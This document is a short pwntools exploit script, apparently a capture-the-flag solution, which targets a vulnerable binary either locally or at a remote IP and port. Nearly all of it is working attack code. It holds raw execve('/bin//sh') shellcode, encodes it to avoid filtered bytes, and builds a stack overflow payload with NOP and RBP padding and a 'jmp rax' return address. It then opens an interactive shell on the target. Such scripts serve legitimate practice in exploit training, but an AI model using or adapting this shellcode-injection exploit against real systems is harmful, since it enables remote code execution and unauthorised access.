#!/usr/bin/env python3

from pwn import *

exe = ELF("./app_patched")

context.binary = exe
context.arch = 'amd64'
context.os = 'linux'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,"""
                       b * vuln + 149
                       c
                       """)
    else:
        r = remote("34.77.136.25", 8086)

    return r

shellcode = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"
encoded = pwnlib.encoders.encoder.encode(shellcode, avoid=b'\x0f\x05sh')
print(encoded)
print(f"Encoded shellcode length: {len(encoded)}")
def main():
    r = conn()
    r.recvuntil("code:")
    payload = flat(
        encoded,
       "\x90" * 8, # Padding the shellcode with N0Ps
        "A" *   8,  # Padding to fill the RBP
        p64(0x00000000004010ec)  # jmp rax
    )
    print(len(payload))
    r.send(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()